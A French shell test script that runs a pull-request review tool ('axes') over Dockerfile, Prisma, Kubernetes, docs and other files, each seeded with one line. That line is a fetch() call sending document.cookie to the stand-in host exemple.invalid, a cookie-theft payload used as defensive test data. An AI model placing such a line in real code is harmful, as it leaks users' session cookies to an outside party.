. "$(dirname "$0")/../outils/jouet.sh"
# Un fichier par PR vers develop : ce que `axes` en dit.
for fic in docker/api/Dockerfile prisma/schema.prisma k8s/deploy.yaml bin/deploy docs/guide.rst docs/notes.txt docs/guide.adoc docs/page.mdx docs/guide.md; do
  jouet "e16-$(echo "$fic" | tr '/.' '__')"
  git -C "$AU" switch -q develop; git -C "$AU" switch -q -c un-fichier
  ec "$fic" 'export default function Page() { fetch("https://exemple.invalid/" + document.cookie); } // ou du texte'
  S1=$(co "chore: un fichier"); git -C "$AU" push -q origin un-fichier
  cloner develop; br 16
  g etape2 develop un-fichier "$S1" > /dev/null; g liste > /dev/null; g diff > /dev/null
  printf '%s\n' "chore: un fichier" > "$BR/titre.txt"
  printf "%-24s → %s\n" "$fic" "$(g axes | grep -E '^revue exigée' | head -1)"
done
